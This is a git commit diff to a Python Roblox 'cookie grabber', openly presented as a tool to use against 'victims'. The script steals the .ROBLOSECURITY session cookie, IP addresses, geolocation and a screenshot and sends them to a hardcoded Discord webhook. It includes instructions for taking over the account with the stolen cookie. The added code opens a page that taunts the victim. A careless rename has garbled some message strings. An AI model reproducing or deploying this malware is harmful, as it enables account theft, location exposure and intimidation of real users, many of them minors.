bd49bf2fa627cfec67cd4140cc3f65c8815f1b57
Mr.Programs <127637860+independent-coder@users.noreply.github.com>
2023-08-05 22:10:49 -0400

    Added, Show an html feature.
    Show an html feature page to the victims

--- R0blUx-Gr@bber.py
+++ R0blUx-Gr@bber.py
@@ -13,13 +13,15 @@ import requests
 import robloxpy
 from discord_webhook import DiscordWebhook, DiscordEmbed
 import sys
+import os
+import webbrowser
 
 # variable
 
 file = "screenshot.png"
 
 
-class SMTHGRB:
+class grabber:
     def __init__(self, webhook: str):
         if not "discord.com/api/webhooks/" in webhook:
             print('You did not provide a webhook on Line 187.')
@@ -82,22 +84,21 @@ class SMTHGRB:
     @staticmethod
     def ip4():
         try:
-            opener = SMTHGRB.create_opener()
+            opener = grabber.create_opener()
             with opener.open('https://4.ident.me') as response:
                 return response.read().decode('ascii')
         except:
             try:
-                opener = SMTHGRB.create_opener()
+                opener = grabber.create_opener()
                 with opener.open('https://4.tnedi.me') as response:
                     return response.read().decode('ascii')
             except:
                 return "N/A"
 
-
     def checker(self):
         if not robloxpy.Utils.CheckCookie(self.cookie) == "Valid Cookie":
             return requests.post(url=self.webhook, data={
-                'content': f'Found a dead cookie on {self.platform}{" - Continuing." if self.platform != "Librewolf" else ""}'})
+                'content': f'Found a dead self on {self.platform}{" - Continuing." if self.platform != "Librewolf" else ""}'})
 
         # The following part should be outside the checker function
         user = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": self.cookie}).json()
@@ -124,11 +125,126 @@ class SMTHGRB:
         hostname = socket.gethostname()
         ip_address = socket.gethostbyname(hostname)
 
+
+
+        def create_html_page(file_path):
+            # HTML content to be written to the file
+            html_content = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Disclaimer</title>
+</head>
+<body>
+    
+</body>
+</html>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background-color: yellow;
+            font-family: 'Poppins', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            margin: 0;
+            position: relative; /* Added position relative to body */
+        }
+        h1, p, h4, h6 {
+            margin: 10px;
+            opacity: 1;
+            transition: opacity 1s ease-in-out;
+        }
+        .hidden {
+            opacity: 0;
+        }
+        #afterCountdown {
+            text-align: center;
+            position: absolute; /* Added position absolute */
+            bottom: 50%; /* Added bottom 50% to vertically center */
+            left: 50%; /* Added left 50% to horizontally center */
+            transform: translate(-50%, 50%); /* Center the element */
+        }
+    </style>
+</head>
+<body>
+    <h1>Your Roblox account is about to get hacked.</h1>
+    <p>I'd recommend changing your ROBLOX Password.</p>
+    <h4>This page will automatically destroy after 10 seconds.</h4>
+    <h4>At this point, the hacker already has Your Location, IP, ROBLOX cookie, and a Screenshot of your computer.</h4>
+    <h4>You can only change your password and say goodbye to your account.</h4>
+    <h6>From a hacker.</h6>
+    <p id="countdown">10</p>
+
+    <p id="afterCountdown" class="hidden">You shouldn't launch this exe, now. It's gone. You can close this page and say goodbye to your account.</p>
+
+    <script>
+        // Function to hide all the messages and countdown
+        function hideMessages() {
+            const messages = document.querySelectorAll('h1, p, h4, h6');
+            messages.forEach((message) => {
+                message.classList.add('hidden');
+            });
+
+            const countdownElement = document.getElementById('countdown');
+            countdownElement.classList.add('hidden');
+
+            const afterCountdownElement = document.getElementById('afterCountdown');
+            afterCountdownElement.classList.remove('hidden');
+        }
+
+        // Function to update the countdown timer
+        function updateCountdown(seconds) {
+            const countdownElement = document.getElementById('countdown');
+            countdownElement.textContent = seconds;
+        }
+
+        // Hide messages after 10 seconds
+        setTimeout(function() {
+            hideMessages();
+        }, 10000);
+
+        // Update countdown every second
+        let remainingSeconds = 10;
+        const countdownInterval = setInterval(function() {
+            remainingSeconds--;
+            updateCountdown(remainingSeconds);
+
+            if (remainingSeconds === 0) {
+                clearInterval(countdownInterval);
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
+
+
+            """
+
+            try:
+                # Write the HTML content to the file
+                with open(file_path, 'w') as file:
+                    file.write(html_content)
+                print("HTML file created successfully.")
+            except Exception as e:
+                print("Error while creating the HTML file:", e)
+
+        # Call the function directly to create the HTML file
+        create_html_page('finalm.html')
+        url = 'finalm.html'
+        webbrowser.open(url)
+        time.sleep(2)
+        os.remove("finalm.html")
+
         self.embeds.append(
             {
                 "title": f"✔ Valid Account - {self.platform}",
                 "description": f"Username: **{user['UserName']}**\nRobux: **R${int(user['RobuxBalance']):,}**\nPremium: **{user['IsPremium']}**\nCreated: **{robloxpy.User.External.CreationDate(id, 1)}** (*{int(robloxpy.User.External.GetAge(id)):,} days ago*)\nRAP: **{int(robloxpy.User.External.GetRAP(id)):,}**\nFriends: **{int(robloxpy.User.Friends.External.GetCount(id)):,}**\n\n------------------------------------------------------------------------\n\n Public IP Address: ||**{ip}**|| \n\n Private IP: Hostname:||**{hostname}**|| IP: ||**{ip_address}**||\n\n------------------------------------------------------------------------\n\nInfo's\n\nCity: {city} \n\n Region: {region_name} \n\n Country: {country} \n\n Latitude: {latitude} \n\n Longitude: {longitude}\n\n------------------------------------------------------------------------\n"
-                               f"\n See the cookie at the other message !",
+                               f"\n See the self at the other message !",
                 "color": 15426612,
                 "footer": {
                     "text": "v1.1.1 ; R0bluxGr@b by Independent-coder"
@@ -152,10 +268,10 @@ class SMTHGRB:
             {
                 "title": f"Access the account on - {self.platform}",
                 "description": f"Username: **{user['UserName']}**\nRobux: **R${int(user['RobuxBalance']):,}**\n Created: **{robloxpy.User.External.CreationDate(id, 1)}** (*{int(robloxpy.User.External.GetAge(id)):,} days ago*)\n  Cookie:\n```fix\n {self.cookie} ```"
-                               f"\n Now copy the cookie go into Roblox login.\n"
+                               f"\n Now copy the self go into Roblox login.\n"
                                f"\n Login into an temporary account."
                                f"\n Open inspect go into Application. Click on Cookies. Click on the 7th Cookies. It should be ROBLOSECURITY."
-                               f"\n Right click on value click modify and delete your and replace by the victim's cookie. \n"
+                               f"\n Right click on value click modify and delete your and replace by the victim's self. \n"
                                f"\n Refresh and you are into his account !"
                                f"\n Thanks for using my cookies grabber for roblox !",
                 "color": 3440107,
@@ -300,7 +416,6 @@ class SMTHGRB:
             }
         )
 
-
         with open(f"{file}", "rb") as f:
             webhook1.add_file(file=f.read(), filename=f"{file}")
 
@@ -309,5 +424,5 @@ class SMTHGRB:
         os.remove(file)
 
 
-SMTHGRB(
+grabber(
     "https://discord.com/api/webhooks/1136110915633287168/KGksoQUmOgEf0O7UjTcmazjVQKhIoL7k8jrPIRSnvbOnVh_dP3cUVoEmCeEP8KnVFjgr")
